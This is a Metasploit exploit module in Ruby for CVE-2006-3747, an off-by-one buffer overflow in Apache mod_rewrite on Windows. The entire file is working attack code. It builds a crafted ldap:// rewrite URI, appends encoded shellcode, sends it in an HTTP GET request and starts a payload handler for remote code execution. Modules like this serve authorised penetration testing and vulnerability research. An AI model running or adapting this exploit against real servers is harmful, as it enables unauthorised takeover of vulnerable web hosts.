require 'msf/core'

module Msf

class Exploits::Windows::Http::Apache_mod_rewrite < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Apache Mod_Rewrite escape_absolute_uri() Off-By-One Buffer Overflow',
			'Description'    => %q{
				This module exploits a off-by-one buffer overflow. RewriteRule must be enabled and rule must meets this criteria:
				*  beginning of the rewritten URL is controlled.
				*  flags on the rule do not include the Forbidden (F), Gone (G), or NoEscape (NE) flag
			},
			'Author'         => [ 'Marcin Kozlowski' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 0001 $',
			'References'     =>
				[
					['CVE', '2006-3747'],
					['BID', '19204'],
					['OSVDB', '27588'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'BadChars'    => "\x00",
					'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
					'DisableNops' => true,
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
						['Apache 1.3 branch (>1.3.28 and <1.3.37), Apache 2.0 branch (2.0.46 and <2.0.59), Apache 2.2 branch (>2.2.0 and <2.2.3)', {'Ret' => 0x90909090 }], # our ret is NOP, since our shellcode is shortly after and will be execute next 
				],
			'DisclosureDate' => 'Aug 28 2006'))
			
			register_options(
				[
					OptString.new('REWRITEPATH', [true, "Rewrite path"]),
					Opt::RPORT(80) 
				], self.class )
	end

	def exploit
		connect

		rewritepath = datastore['REWRITEPATH']


		uri = "/#{rewritepath}/ldap://"+rand_text_alphanumeric(rand(16))+"/"+rand_text_alphanumeric(rand(32))+"%3f"+rand_text_alphanumeric(rand(8))+"%3f"+rand_text_alphanumeric(rand(8))+"%3f"+rand_text_alphanumeric(rand(16))+"%3f"+rand_text_alphanumeric(rand(8))+"%3f%90"	
		uri += payload.encoded
		
		
		res = "GET #{uri} HTTP/1.0\r\n\r\n"
		print_status("Trying ...")
		sock.put(res)
		sock.close
		
		handler
		disconnect
	end



end
end	
